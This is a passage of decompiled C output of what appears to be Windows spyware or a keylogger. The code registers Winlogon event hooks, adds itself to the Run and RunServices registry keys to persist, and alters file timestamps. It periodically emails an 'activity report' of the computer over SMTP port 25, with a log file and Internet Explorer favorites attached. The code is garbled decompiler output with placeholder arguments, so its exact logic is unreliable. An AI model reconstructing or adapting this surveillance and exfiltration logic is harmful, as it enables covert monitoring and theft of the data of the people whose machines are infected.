    v48 = (char *)0x76454c57;
    int32_t v50 = v8 + v49; // 0x405fc7
    int32_t v51 = v8 + (int32_t)"WLEventLock"; // 0x405fc7
    *(int32_t *)v50 = *(int32_t *)v51;
    *(int32_t *)(v50 + v8) = *(int32_t *)(v51 + v8);
    int32_t v52 = 0; // bp-344, 0x405fd5
    int32_t v53 = v8 + (int32_t)&v52; // 0x405fd5
    *(int32_t *)v53 = 0;
    *(int32_t *)(v53 + v8) = 0;
    char * v54 = (char *)0x76454c57; // bp-332, 0x405fe0
    int32_t v55 = v8 + (int32_t)&v54; // 0x405fe0
    int32_t v56 = v8 + (int32_t)"WLEventLogoff"; // 0x405fe0
    *(int32_t *)v55 = *(int32_t *)v56;
    int32_t v57 = v55 + v8; // 0x405fe1
    int32_t v58 = v56 + v8; // 0x405fe1
    *(int32_t *)v57 = *(int32_t *)v58;
    *(int16_t *)(v57 + v8) = *(int16_t *)(v58 + v8);
    int32_t v59 = 0; // bp-318, 0x405ff0
    int32_t v60 = v8 + (int32_t)&v59; // 0x405ff0
    *(int32_t *)v60 = 0;
    *(int16_t *)(v60 + v8) = 0;
    char * v61 = (char *)0x76454c57; // bp-308, 0x405ffc
    int32_t v62 = v8 + (int32_t)&v61; // 0x405ffc
    int32_t v63 = v8 + (int32_t)"WLEventLogon"; // 0x405ffc
    *(int32_t *)v62 = *(int32_t *)v63;
    int32_t v64 = v62 + v8; // 0x405ffd
    int32_t v65 = v63 + v8; // 0x405ffd
    *(int32_t *)v64 = *(int32_t *)v65;
    *(char *)(v64 + v8) = *(char *)(v65 + v8);
    int32_t v66 = 0; // bp-295, 0x40600b
    int32_t v67 = v8 + (int32_t)&v66; // 0x40600b
    *(int32_t *)v67 = 0;
    int32_t v68 = v67 + v8; // 0x40600c
    *(int16_t *)v68 = 0;
    *(char *)(v68 + v15) = 0;
    char * v69 = (char *)0x76454c57; // bp-284, 0x406018
    int32_t v70 = v8 + (int32_t)&v69; // 0x406018
    int32_t v71 = v8 + (int32_t)"WLEventShutdown"; // 0x406018
    *(int32_t *)v70 = *(int32_t *)v71;
    int32_t v72 = v70 + v8; // 0x406019
    int32_t v73 = v71 + v8; // 0x406019
    *(int32_t *)v72 = *(int32_t *)v73;
    *(int32_t *)(v72 + v8) = *(int32_t *)(v73 + v8);
    int32_t v74 = 0; // bp-268, 0x406024
    *(int32_t *)(v8 + (int32_t)&v74) = 0;
    int32_t v75; // bp-260, 0x405e1e
    __asm_rep_movsd_memcpy((char *)&v75, "WLEventStartScreenSaver", 6);
    char * v76 = (char *)0x76454c57; // bp-236, 0x40603f
    int32_t v77 = v8 + (int32_t)&v76; // 0x40603f
    int32_t v78 = v8 + (int32_t)"WLEventStartup"; // 0x40603f
    *(int32_t *)v77 = *(int32_t *)v78;
    int32_t v79 = v77 + v8; // 0x406040
    int32_t v80 = v78 + v8; // 0x406040
    *(int32_t *)v79 = *(int32_t *)v80;
    int32_t v81 = v79 + v8; // 0x406041
    int32_t v82 = v80 + v8; // 0x406041
    *(int16_t *)v81 = *(int16_t *)v82;
    *(char *)(v81 + v15) = *(char *)(v82 + v15);
    int32_t v83 = 0; // bp-221, 0x40604d
    int32_t v84 = v8 + (int32_t)&v83; // 0x40604d
    *(int32_t *)v84 = 0;
    *(char *)(v84 + v8) = 0;
    int32_t v85; // bp-212, 0x405e1e
    __asm_rep_movsd_memcpy((char *)&v85, "WLEventStopScreenSaver", 5);
    char * v86 = (char *)0x76454c57; // bp-188, 0x406077
    int32_t v87 = v8 + (int32_t)&v86; // 0x406077
    int32_t v88 = v8 + (int32_t)"WLEventUnlock"; // 0x406077
    *(int32_t *)v87 = *(int32_t *)v88;
    int32_t v89 = v87 + v8; // 0x406078
    int32_t v90 = v88 + v8; // 0x406078
    *(int32_t *)v89 = *(int32_t *)v90;
    *(int16_t *)(v89 + v8) = *(int16_t *)(v90 + v8);
    int32_t v91 = 0; // bp-174, 0x406088
    int32_t v92 = v8 + (int32_t)&v91; // 0x406088
    *(int32_t *)v92 = 0;
    *(int16_t *)(v92 + v8) = 0;
    int32_t str3 = 8; // 0x406092
    int32_t v93 = v49; // 0x406092
    int32_t v94 = v6; // 0x406092
    int32_t v95 = &v4;
    int32_t * v96 = (int32_t *)(v95 - 4); // 0x406099
    *v96 = v93;
    *v96 = strlen((char *)str3) + 1;
    *(int32_t *)(v95 - 8) = v93;
    *(int32_t *)(v95 - 12) = 1;
    *(int32_t *)(v95 - 16) = 0;
    *(int32_t *)(v95 - 20) = v94;
    int32_t v97 = v95 - 24; // 0x4060a8
    *(int32_t *)v97 = phkResult;
    RegSetValueExA(&g57, (char *)&g57, (int32_t)&g57, (int32_t)&g57, (char *)&g57, (int32_t)&g57);
    str3--;
    v93 += 24;
    v94 += 18;
    while (str3 != 0) {
        // 0x406099
        v95 = v97;
        v96 = (int32_t *)(v95 - 4);
        *v96 = v93;
        *v96 = strlen((char *)str3) + 1;
        *(int32_t *)(v95 - 8) = v93;
        *(int32_t *)(v95 - 12) = 1;
        *(int32_t *)(v95 - 16) = 0;
        *(int32_t *)(v95 - 20) = v94;
        v97 = v95 - 24;
        *(int32_t *)v97 = phkResult;
        RegSetValueExA(&g57, (char *)&g57, (int32_t)&g57, (int32_t)&g57, (char *)&g57, (int32_t)&g57);
        str3--;
        v93 += 24;
        v94 += 18;
    }
    // 0x4060b8
    *(int32_t *)(v95 - 28) = phkResult;
    RegCloseKey(NULL);
    *(int32_t *)(v95 - 32) = 1;
    // 0x4060c4
    return 1;
}

// Address range: 0x4060cb - 0x4061fd
int32_t function_4060cb(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4060cb
    int32_t str; // bp-680, 0x4060cb
    sprintf((char *)&str, "%s.dll", (char *)a2);
    function_405e1e(&str, a2);
    int32_t lpVersionInformation = 148; // bp-160, 0x406109
    struct _OSVERSIONINFOA * v1 = (struct _OSVERSIONINFOA *)&lpVersionInformation; // bp-704, 0x406113
    bool v2 = GetVersionExA((struct _OSVERSIONINFOA *)&lpVersionInformation); // 0x406114
    int32_t v3 = (int32_t)&v1; // 0x40612b
    int32_t v4; // 0x4060cb
    int32_t str2; // bp-420, 0x4060cb
    int32_t v5; // bp-8, 0x4060cb
    int32_t v6; // 0x4060cb
    if (v6 == 1 == v2) {
        // 0x40613d
        sprintf((char *)&str2, "Software\\Microsoft\\Windows\\CurrentVersion\\%s", "RunServices");
        int32_t v7 = -0x7ffffffe; // bp-720, 0x406161
        v3 = &v7;
        int32_t v8 = function_4061fd(-0x7ffffffe, &str2, 0x20006, &v5); // 0x406162
        v4 = v3;
        if (v8 == 0) {
            goto lab_0x4061b8;
        } else {
            goto lab_0x40616b;
        }
    } else {
        goto lab_0x40616b;
    }
  lab_0x40616b:;
    int32_t * v9 = (int32_t *)(v3 - 4); // 0x40616b
    *v9 = (int32_t)"Run";
    int32_t * v10 = (int32_t *)(v3 - 8); // 0x406176
    *v10 = (int32_t)"Software\\Microsoft\\Windows\\CurrentVersion\\%s";
    int32_t * v11 = (int32_t *)(v3 - 12); // 0x406177
    int32_t v12 = &str2; // 0x406177
    *v11 = v12;
    sprintf((char *)&g57, (char *)&g57);
    int32_t v13 = &v5; // 0x406186
    *v9 = v13;
    *v10 = 0x20006;
    *v11 = v12;
    int32_t v14 = v3 - 16; // 0x40618f
    *(int32_t *)v14 = -0x7ffffffe;
    int32_t v15 = function_4061fd((int32_t)&g57, &g57, (int32_t)&g57, &g57); // 0x406190
    v4 = v14;
    int32_t result; // 0x4060cb
    int32_t v16; // 0x4060cb
    if (v15 == 0) {
        goto lab_0x4061b8;
    } else {
        // 0x406199
        *(int32_t *)(v3 - 20) = v13;
        *(int32_t *)(v3 - 24) = 0x20006;
        *(int32_t *)(v3 - 28) = v12;
        int32_t v17 = v3 - 32; // 0x4061a8
        *(int32_t *)v17 = -0x7fffffff;
        int32_t v18 = function_4061fd((int32_t)&g57, &g57, (int32_t)&g57, &g57); // 0x4061ad
        v4 = v17;
        v16 = v17;
        result = v18;
        if (v18 != 0) {
            goto lab_0x4061eb;
        } else {
            goto lab_0x4061b8;
        }
    }
  lab_0x4061b8:;
    int32_t * v19 = (int32_t *)(v4 - 4);
    if (a3 != 0) {
        // 0x4061cc
        *v19 = a1;
        *v19 = strlen((char *)&g57);
        *(int32_t *)(v4 - 8) = a1;
        *(int32_t *)(v4 - 12) = 1;
        *(int32_t *)(v4 - 16) = 0;
        *(int32_t *)(v4 - 20) = a2;
        int32_t v20 = v4 - 24; // 0x4061e0
        *(int32_t *)v20 = v5;
        int32_t v21 = RegSetValueExA(&g57, (char *)&g57, (int32_t)&g57, (int32_t)&g57, (char *)&g57, (int32_t)&g57); // 0x4061e3
        v16 = v20;
        result = v21;
    } else {
        // 0x4061be
        *v19 = a2;
        int32_t v22 = v4 - 8; // 0x4061c1
        *(int32_t *)v22 = v5;
        int32_t v23 = RegDeleteValueA(&g57, (char *)&g57); // 0x4061c4
        v16 = v22;
        result = v23;
    }
    goto lab_0x4061eb;
  lab_0x4061eb:
    // 0x4061eb
    *(int32_t *)(v16 - 4) = v5;
    RegCloseKey(&g57);
    return result;
}

// Address range: 0x4061fd - 0x4062af
int32_t function_4061fd(int32_t a1, int32_t * str, int32_t a3, int32_t * a4) {
    int32_t v1 = (int32_t)str;
    int32_t v2 = _3f__3f_2_40_YAPAXI_40_Z(strlen((char *)str) + 1); // 0x406216
    int32_t len = strlen((char *)str); // 0x40621f
    int32_t v3; // bp-24, 0x4061fd
    int32_t v4 = &v3; // 0x406226
    int32_t v5 = a1; // 0x40622b
    int32_t v6 = v4; // 0x40622b
    int32_t v7 = v1; // 0x40622b
    int32_t result; // 0x4061fd
    if (len + v1 <= v1) {
        // 0x40629c
        *(int32_t *)(v4 - 4) = v2;
        _3f__3f_3_40_YAXPAX_40_Z(&g57);
        return result;
    }
    int32_t hKey; // 0x406263
    while (true) {
        int32_t v8 = v6;
        int32_t * v9 = (int32_t *)(v8 - 4);
        int32_t v10 = 0; // 0x40622f
        int32_t v11 = v7; // 0x40622f
        int32_t v12; // 0x4061fd
        int32_t v13; // 0x4061fd
        while (true) {
          lab_0x406231:
            // 0x406231
            v12 = v11;
            v13 = v10;
            char v14 = *(char *)v12; // 0x406231
            switch (v14) {
                case 92: {
                    goto lab_0x40624d;
                }
                case 0: {
                    goto lab_0x40624d;
                }
                default: {
                    // 0x40623b
                    *v9 = v12;
                    *(char *)(v13 + v2) = v14;
                    char * v15 = _mbsinc((char *)&g57); // 0x406243
                    v10 = v13 + 1;
                    v11 = (int32_t)v15;
                    goto lab_0x406231;
                }
            }
        }
      lab_0x40624d:
        // 0x40624d
        *v9 = 0;
        *(char *)(v13 + v2) = 0;
        *(int32_t *)(v8 - 8) = (int32_t)a4;
        *(int32_t *)(v8 - 12) = 0;
        *(int32_t *)(v8 - 16) = a3;
        *(int32_t *)(v8 - 20) = 0;
        *(int32_t *)(v8 - 24) = 0;
        *(int32_t *)(v8 - 28) = 0;
        *(int32_t *)(v8 - 32) = v2;
        *(int32_t *)(v8 - 36) = v5;
        hKey = RegCreateKeyExA(&g57, (char *)&g57, (int32_t)&g57, (char *)&g57, (int32_t)&g57, (int32_t)&g57, (struct _SECURITY_ATTRIBUTES *)&g57, (int32_t **)&g57, &g57);
        v6 = v8 - 40;
        *(int32_t *)v6 = v5;
        RegCloseKey((int32_t *)hKey);
        if (hKey != 0) {
            // break -> 0x40629a
            break;
        }
        // 0x40627a
        v5 = *a4;
        *(int32_t *)(v8 - 44) = v12;
        v7 = (int32_t)_mbsinc((char *)v5);
        *(int32_t *)(v8 - 48) = v1;
        int32_t len2 = strlen((char *)&g57); // 0x40628a
        result = hKey;
        int32_t v16 = v6; // 0x406296
        if (len2 + v1 <= v7) {
            // 0x40629c
            *(int32_t *)(v16 - 4) = v2;
            _3f__3f_3_40_YAXPAX_40_Z(&g57);
            return result;
        }
    }
    // 0x40629a
    *a4 = 0;
    // 0x40629c
    *(int32_t *)(v6 - 4) = v2;
    _3f__3f_3_40_YAXPAX_40_Z(&g57);
    return hKey;
}

// Address range: 0x4062af - 0x4062ed
int32_t function_4062af(int32_t lpFileName, int32_t a2) {
    // 0x4062af
    if (a2 == 0) {
        // 0x4062e9
        return 0;
    }
    int32_t v1 = lpFileName; // bp-36, 0x4062c6
    int32_t * fileHandle = CreateFileA((char *)lpFileName, 0x40000000, 0, NULL, 3, 0, NULL); // 0x4062ca
    int32_t v2 = (int32_t)fileHandle; // 0x4062ca
    int32_t * v3 = &v1; // 0x4062d5
    if (fileHandle != (int32_t *)-1) {
        int32_t v4 = v2; // bp-52, 0x4062da
        struct _FILETIME * lpCreationTime = (struct _FILETIME *)a2; // 0x4062db
        SetFileTime(fileHandle, lpCreationTime, lpCreationTime, lpCreationTime);
        v3 = &v4;
    }
    // 0x4062e1
    *(int32_t *)((int32_t)v3 - 4) = v2;
    // 0x4062e9
    return CloseHandle(&g57);
}

// Address range: 0x4062ed - 0x40630e
int32_t function_4062ed(void) {
    // 0x4062ed
    if ((g53 & 1) == 0) {
        // 0x4062f6
        g53 |= 1;
    }
    // 0x406302
    return function_408584(0x4078aa);
}

// Address range: 0x40630e - 0x406374
int32_t function_40630e(int32_t a1) {
    char * v1 = "-r"; // bp-4, 0x40630e
    int32_t v2 = _mbsstr((char *)a1, "-r") != NULL; // 0x406320
    int32_t v3 = v2; // bp-12, 0x406322
    if (function_406b97(v2) < 1) {
        // 0x40636f
        return 0;
    }
    // 0x40632f
    int32_t v4; // 0x40630e
    v1 = (char *)v4;
    int32_t hHandle = function_404562(1); // 0x406332
    int32_t v5; // 0x40630e
    if (g30 == 0) {
        // 0x40634c
        v3 = hHandle;
        WaitForSingleObject((int32_t *)hHandle, -1);
        v5 = &v3;
    } else {
        // 0x406343
        function_406374(hHandle);
        v5 = (int32_t)&v1;
    }
    // 0x406355
    *(int32_t *)(v5 - 4) = hHandle;
    CloseHandle(&g57);
    *(int32_t *)(v5 - 8) = g46;
    FreeLibrary(&g57);
    // 0x40636f
    return 0;
}

// Address range: 0x406374 - 0x40668d
int32_t function_406374(int32_t a1) {
    // 0x406374
    function_408520((int32_t)&g57);
    int32_t v1 = 0xea60 * (60 * (24 * (int32_t)(uint16_t)g34 + (int32_t)g35) + (int32_t)g36); // 0x4063ac
    int32_t v2 = v1 != 0 ? v1 : 0x249f0;
    int32_t v3; // 0x406374
    int32_t v4 = v3 - 20; // 0x4063b8
    int32_t * data2 = (int32_t *)v4; // 0x4063b8
    *data2 = 0;
    int32_t * v5 = (int32_t *)(v3 - 24); // 0x4063bc
    *v5 = 0;
    char * file_path = (char *)&g48; // bp-664, 0x4063c5
    int32_t * v6 = (int32_t *)(v3 - 40); // 0x4063ca
    *v6 = v2;
    struct _IO_FILE * file = fopen(file_path, "rb"); // 0x4063cd
    int32_t * v7; // 0x406374
    int32_t v8; // 0x406374
    if (file == NULL) {
        // 0x406374
        v7 = (int32_t *)(v3 - 16);
        v8 = 0x249f0;
    } else {
        // 0x4063de
        file_path = (char *)4;
        int32_t * data = (int32_t *)(v3 - 16);
        int32_t v9 = v2; // 0x4063f1
        if (fread(data, 1, 4, file) != 0) {
            int32_t time1 = v3 - 28; // 0x4063f3
            time(&((struct _IO_FILE *)time1)->e0);
            int32_t time0 = *data; // 0x4063fc
            file_path = (char *)time0;
            difftime(*(int32_t *)time1, time0);
            v9 = v2;
            int32_t v10; // 0x406374
            if ((v10 & 0x4100) == 0) {
                // 0x406415
                *(int32_t *)(v3 - 32) = 0;
                *(int32_t *)(v3 - 36) = v2;
                v9 = 0x249f0;
                if ((v10 & 256) != 0) {
                    // 0x40642e
                    v9 = v2 - function_408644();
                }
            }
        }
        // 0x40643f
        if ((g31 & 32) != 0) {
            // 0x406448
            file_path = (char *)4;
            fread(data2, 1, 4, file);
        }
        // 0x406459
        fclose(file);
        v7 = data;
        v8 = v9;
    }
    uint32_t v11 = v8;
    int32_t v12 = v3 - 104; // 0x40646a
    file_path = (char *)v12;
    *v7 = 1;
    function_407598((int32_t)file_path, 32);
    int32_t v13 = v3 - 136; // 0x40647c
    function_40756d(v13, 32);
    char * v14 = (char *)v13; // 0x406497
    file_path = v14;
    int32_t str = v3 - 656; // 0x406498
    sprintf((char *)str, "Activity Report of computer %s (%s)", v14, (struct _IO_FILE *)v12);
    int32_t * v15 = (int32_t *)(v3 + 8); // 0x4064b3
    int32_t hHandle = *v15; // 0x4064b3
    file_path = (char *)hHandle;
    int32_t v16 = (int32_t)&file_path; // 0x4064b3
    int32_t v17 = v16; // 0x4064bd
    if (WaitForSingleObject((int32_t *)hHandle, v11 >= 0x249f0 ? v11 : 0x249f0) == 258) {
        char * v18 = (char *)(v3 + 11);
        int32_t v19 = v3 - 56;
        int32_t v20 = v3 - 4;
        int32_t * v21 = (int32_t *)v20;
        char * v22 = (char *)v20;
        int32_t v23 = v3 - 396;
        int32_t v24 = v3 - 28;
        int32_t v25 = v16; // 0x4064cf
        int32_t v26; // 0x406374
        int32_t v27; // 0x4064d8
        int32_t v28; // 0x4064ef
        int32_t v29; // 0x4064fd
        int32_t * v30; // 0x406510
        int32_t v31; // 0x406539
        char v32; // 0x406374
        if ((g31 & 32) != 0) {
            // 0x4064d5
            v27 = v16 - 4;
            *(int32_t *)v27 = 0;
            *(char *)v19 = *v18;
            function_4047b7((int32_t)&g57);
            *v21 = 0;
            *(int32_t *)(v16 - 8) = v19;
            *(int32_t *)(v16 - 12) = 6;
            v28 = function_404b28((int32_t)&g57, (int32_t)&g57);
            v26 = v27;
            if (v28 != 0) {
                // 0x4064fa
                v29 = v16 - 20;
                *v5 = v29;
                *(int32_t *)(v16 - 24) = 0;
                *(char *)v29 = *v18;
                function_4047b7((int32_t)&g57);
                v30 = (int32_t *)(v16 - 28);
                *v30 = (int32_t)"*.*";
                *v30 = strlen((char *)&g57);
                *(int32_t *)(v16 - 32) = (int32_t)"*.*";
                function_405027((int32_t)&g57);
                *(int32_t *)(v3 - 32) = v16 - 48;
                *(int32_t *)(v16 - 52) = v19;
                *v22 = 1;
                function_404f2f((int32_t)&g57);
                *v22 = 0;
                v31 = function_404bb1();
                *v5 = v31;
                v32 = g31;
                if (v31 == 0 | v31 == *data2) {
                    // 0x406556
                    g31 = v32 & -65;
                    v26 = v29;
                } else {
                    // 0x40654d
                    g31 = v32 | 64;
                    v26 = v29;
                }
            }
            // 0x40655d
            *v21 = -1;
            v25 = v26 - 4;
            *(int32_t *)v25 = 1;
            function_4047b7((int32_t)&g57);
        }
        int32_t * v33 = (int32_t *)(v25 - 4); // 0x406574
        *v33 = v3 - 72;
        int32_t v34 = function_40731f((int32_t)&g57, (int32_t)&g57); // 0x406575
        int32_t v35 = *(int32_t *)(v34 + 4); // 0x40657a
        *v33 = v35 != 0 ? v35 : (int32_t)&g2;
        int32_t * v36 = (int32_t *)(v25 - 8); // 0x40658e
        *v36 = (int32_t)"%s activity report";
        int32_t v37 = v25 - 12; // 0x406593
        int32_t * v38 = (int32_t *)v37; // 0x406593
        *v38 = v23;
        sprintf((char *)&g57, (char *)&g57);
        *v33 = 1;
        function_4047b7((int32_t)&g57);
        *v36 = (int32_t)"See attached file(s)...";
        *v38 = v23;
        int32_t * v39 = (int32_t *)(v25 - 16); // 0x4065b8
        *v39 = str;
        int32_t * v40 = (int32_t *)(v25 - 20); // 0x4065b9
        *v40 = *v7;
        *(int32_t *)(v25 - 24) = (int32_t)&g47;
        int32_t v41 = 0; // 0x4065cb
        int32_t v42 = 0x249f0; // 0x4065cb
        struct _IO_FILE * file2; // 0x4065e2
        int32_t v43; // 0x4065e2
        if (function_40668d() != 0) {
            // 0x4065cd
            *v36 = v24;
            time(&g57);
            *v36 = (int32_t)&g20;
            *v38 = (int32_t)&g48;
            file2 = fopen((char *)&g57, (char *)&g57);
            if (file2 != NULL) {
                // 0x4065ef
                v43 = (int32_t)file2;
                *v36 = v43;
                *v38 = 4;
                *v39 = 1;
                *v40 = v24;
                fwrite(&g57, (int32_t)&g57, (int32_t)&g57, (struct _IO_FILE *)&g57);
                if ((g31 & 32) != 0) {
                    // 0x406609
                    *v36 = v43;
                    *data2 = *v5;
                    *v38 = 4;
                    *v39 = 1;
                    *v40 = v4;
                    fwrite(&g57, (int32_t)&g57, (int32_t)&g57, (struct _IO_FILE *)&g57);
                }
                // 0x406620
                *v36 = v43;
                fclose((struct _IO_FILE *)&g57);
            }
            // 0x406627
            v42 = *v6;
            v41 = 1;
        }
        // 0x40663c
        *v7 = v41;
        *v36 = v42;
        *v38 = *v15;
        int32_t v44 = WaitForSingleObject(&g57, (int32_t)&g57); // 0x406640
        v17 = v37;
        while (v44 == 258) {
            int32_t v45 = v37;
            v25 = v45;
            if ((g31 & 32) != 0) {
                // 0x4064d5
                v27 = v45 - 4;
                *(int32_t *)v27 = 0;
                *(char *)v19 = *v18;
                function_4047b7((int32_t)&g57);
                *v21 = 0;
                *(int32_t *)(v45 - 8) = v19;
                *(int32_t *)(v45 - 12) = 6;
                v28 = function_404b28((int32_t)&g57, (int32_t)&g57);
                v26 = v27;
                if (v28 != 0) {
                    // 0x4064fa
                    v29 = v45 - 20;
                    *v5 = v29;
                    *(int32_t *)(v45 - 24) = 0;
                    *(char *)v29 = *v18;
                    function_4047b7((int32_t)&g57);
                    v30 = (int32_t *)(v45 - 28);
                    *v30 = (int32_t)"*.*";
                    *v30 = strlen((char *)&g57);
                    *(int32_t *)(v45 - 32) = (int32_t)"*.*";
                    function_405027((int32_t)&g57);
                    *(int32_t *)(v3 - 32) = v45 - 48;
                    *(int32_t *)(v45 - 52) = v19;
                    *v22 = 1;
                    function_404f2f((int32_t)&g57);
                    *v22 = 0;
                    v31 = function_404bb1();
                    *v5 = v31;
                    v32 = g31;
                    if (v31 == 0 | v31 == *data2) {
                        // 0x406556
                        g31 = v32 & -65;
                        v26 = v29;
                    } else {
                        // 0x40654d
                        g31 = v32 | 64;
                        v26 = v29;
                    }
                }
                // 0x40655d
                *v21 = -1;
                v25 = v26 - 4;
                *(int32_t *)v25 = 1;
                function_4047b7((int32_t)&g57);
            }
            // 0x40656b
            v33 = (int32_t *)(v25 - 4);
            *v33 = v3 - 72;
            v34 = function_40731f((int32_t)&g57, (int32_t)&g57);
            v35 = *(int32_t *)(v34 + 4);
            *v33 = v35 != 0 ? v35 : (int32_t)&g2;
            v36 = (int32_t *)(v25 - 8);
            *v36 = (int32_t)"%s activity report";
            v37 = v25 - 12;
            v38 = (int32_t *)v37;
            *v38 = v23;
            sprintf((char *)&g57, (char *)&g57);
            *v33 = 1;
            function_4047b7((int32_t)&g57);
            *v36 = (int32_t)"See attached file(s)...";
            *v38 = v23;
            v39 = (int32_t *)(v25 - 16);
            *v39 = str;
            v40 = (int32_t *)(v25 - 20);
            *v40 = *v7;
            *(int32_t *)(v25 - 24) = (int32_t)&g47;
            v41 = 0;
            v42 = 0x249f0;
            if (function_40668d() != 0) {
                // 0x4065cd
                *v36 = v24;
                time(&g57);
                *v36 = (int32_t)&g20;
                *v38 = (int32_t)&g48;
                file2 = fopen((char *)&g57, (char *)&g57);
                if (file2 != NULL) {
                    // 0x4065ef
                    v43 = (int32_t)file2;
                    *v36 = v43;
                    *v38 = 4;
                    *v39 = 1;
                    *v40 = v24;
                    fwrite(&g57, (int32_t)&g57, (int32_t)&g57, (struct _IO_FILE *)&g57);
                    if ((g31 & 32) != 0) {
                        // 0x406609
                        *v36 = v43;
                        *data2 = *v5;
                        *v38 = 4;
                        *v39 = 1;
                        *v40 = v4;
                        fwrite(&g57, (int32_t)&g57, (int32_t)&g57, (struct _IO_FILE *)&g57);
                    }
                    // 0x406620
                    *v36 = v43;
                    fclose((struct _IO_FILE *)&g57);
                }
                // 0x406627
                v42 = *v6;
                v41 = 1;
            }
            // 0x40663c
            *v7 = v41;
            *v36 = v42;
            *v38 = *v15;
            v44 = WaitForSingleObject(&g57, (int32_t)&g57);
            v17 = v37;
        }
    }
    // 0x40664d
    *(int32_t *)(v17 - 4) = g37;
    _3f__3f_3_40_YAXPAX_40_Z(&g57);
    *(int32_t *)(v17 - 8) = g39;
    _3f__3f_3_40_YAXPAX_40_Z(&g57);
    *(int32_t *)(v17 - 12) = g40;
    _3f__3f_3_40_YAXPAX_40_Z(&g57);
    *(int32_t *)(v17 - 16) = g38;
    _3f__3f_3_40_YAXPAX_40_Z(&g57);
    __writefsdword(0, *(int32_t *)(v3 - 12));
    return 0;
}

// Address range: 0x40668d - 0x406ae8
int32_t function_40668d(void) {
    // 0x40668d
    function_408520((int32_t)&g57);
    int32_t v1; // 0x40668d
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x40669e
    int32_t v3 = *v2; // 0x40669e
    int32_t v4; // bp-1228, 0x40668d
    int32_t v5 = &v4; // 0x4066a5
    if (v3 != 0) {
        char * lpFileName = (char *)v3; // 0x4066a7
        char * v6 = lpFileName; // bp-1232, 0x4066a7
        int32_t v7 = GetFileAttributesA(lpFileName); // 0x4066a8
        v5 = (int32_t)&v6;
        if (v7 == -1) {
            // 0x406ad9
            __writefsdword(0, *(int32_t *)(v1 - 12));
            return 0;
        }
    }
    // 0x4066ba
    function_40543c();
    int32_t v8 = v1 - 4; // 0x4066c2
    int32_t * v9 = (int32_t *)v8; // 0x4066c2
    *v9 = 0;
    function_4078cc();
    *(int32_t *)(v5 - 4) = g38;
    char * v10 = (char *)v8; // 0x4066dd
    *v10 = 1;
    function_407910((int32_t)&g57);
    *(int32_t *)(v5 - 8) = g37;
    *(int32_t *)(v5 - 12) = 2;
    function_4079c6((int32_t)&g57, (int32_t)&g57);
    *(int32_t *)(v5 - 16) = (int32_t)"25";
    int32_t v11 = v5 - 20; // 0x4066fe
    *(int32_t *)v11 = 1;
    function_4079c6((int32_t)&g57, (int32_t)&g57);
    char v12 = *(char *)&g29; // 0x40670b
    int32_t * v13 = (int32_t *)(v5 - 24); // 0x406711
    *v13 = 64;
    int32_t v14 = v1 - 447; // 0x406716
    int32_t v15 = v1 - 448; // 0x40671c
    char * v16 = (char *)v15; // 0x40671c
    *v16 = v12;
    __asm_rep_stosd_memset((char *)v14, 0, 64);
    bool v17; // 0x40668d
    int32_t v18 = v17 ? -256 : 256; // 0x406722
    int32_t v19 = v18 + v14; // 0x406722
    *(int16_t *)v19 = 0;
    int32_t v20 = v17 ? -2 : 2; // 0x406724
    *(char *)(v19 + v20) = 0;
    *v13 = 64;
    int32_t v21 = v1 - 967; // 0x40672c
    int32_t v22 = v1 - 968; // 0x406732
    *(char *)v22 = v12;
    __asm_rep_stosd_memset((char *)v21, 0, 64);
    int32_t v23 = v18 + v21; // 0x40673e
    *(int16_t *)v23 = 0;
    *(char *)(v23 + v20) = 0;
    int32_t v24 = v11; // 0x406745
    if (v3 != 0) {
        // 0x40674b
        *v13 = v22;
        int32_t v25 = v5 - 28; // 0x406752
        *(int32_t *)v25 = 260;
        GetTempPathA((int32_t)&g57, (char *)&g57);
        int32_t v26 = rand(); // 0x406759
        int32_t * v27 = (int32_t *)(v5 - 32); // 0x40675e
        *v27 = (int32_t)((0x100000000 * (int64_t)(v26 >> 31) | (int64_t)v26) % 100);
        int32_t * v28 = (int32_t *)(v5 - 36); // 0x40676b
        *v28 = v22;
        int32_t * v29 = (int32_t *)(v5 - 40); // 0x406772
        *v29 = (int32_t)"%s\\mnsvcpr%d";
        int32_t v30 = v5 - 44; // 0x406777
        int32_t * v31 = (int32_t *)v30; // 0x406777
        *v31 = v15;
        sprintf((char *)&g57, (char *)&g57);
        *(int32_t *)(v5 - 48) = v15;
        *(int32_t *)(v5 - 52) = v3;
        if (function_404700((int32_t)&g57, (int32_t)&g57) == 0) {
            // 0x4067b9
            *v27 = (int32_t)"Unable to open logfile while sending e-mail";
            *v28 = (int32_t)"ERROR";
            *v16 = 0;
            v24 = v25;
        } else {
            // 0x406791
            *v27 = v15;
            *v28 = 8;
            function_4079c6((int32_t)&g57, (int32_t)&g57);
            *v29 = (int32_t)"LogFile.log";
            *v31 = 9;
            function_4079c6((int32_t)&g57, (int32_t)&g57);
            v24 = v30;
        }
    }
    int32_t * v32 = (int32_t *)(v24 - 4); // 0x4067d7
    *v32 = 64;
    int32_t v33 = v1 - 708; // 0x4067d9
    *(char *)v33 = *(char *)&g29;
    int32_t v34 = *v32; // 0x4067df
    int32_t v35 = v1 - 707; // 0x4067e2
    __asm_rep_stosd_memset((char *)v35, 0, v34);
    int32_t v36 = v34 * (v17 ? -4 : 4) + v35; // 0x4067e8
    *(int16_t *)v36 = 0;
    *(char *)(v36 + v20) = 0;
    int32_t v37 = v24; // 0x4067f4
    if ((g31 & 96) == 96) {
        int32_t v38 = v1 - 1228; // 0x4067fa
        *v32 = v38;
        *(int32_t *)(v24 - 8) = 260;
        GetTempPathA((int32_t)&g57, (char *)&g57);
        *(int32_t *)(v24 - 12) = v33;
        *(int32_t *)(v24 - 16) = 0;
        *(int32_t *)(v24 - 20) = (int32_t)"ief_";
        *(int32_t *)(v24 - 24) = v38;
        GetTempFileNameA((char *)&g57, (char *)&g57, (int32_t)&g57, (char *)&g57);
        int32_t v39 = v24 - 28; // 0x40682c
        *(int32_t *)v39 = v33;
        v37 = v39;
        if (function_40568c() != 0) {
            // 0x406836
            *(int32_t *)(v24 - 32) = v33;
            *(int32_t *)(v24 - 36) = 10;
            function_4079c6((int32_t)&g57, (int32_t)&g57);
            *(int32_t *)(v24 - 40) = (int32_t)"IE_Favorites.html";
            int32_t v40 = v24 - 44; // 0x40684f
            *(int32_t *)v40 = 11;
            function_4079c6((int32_t)&g57, (int32_t)&g57);
            v37 = v40;
        }
    }
    int32_t * v41 = (int32_t *)(v1 + 16); // 0x40685c
    *(int32_t *)(v37 - 4) = *v41;
    *(int32_t *)(v37 - 8) = 4;
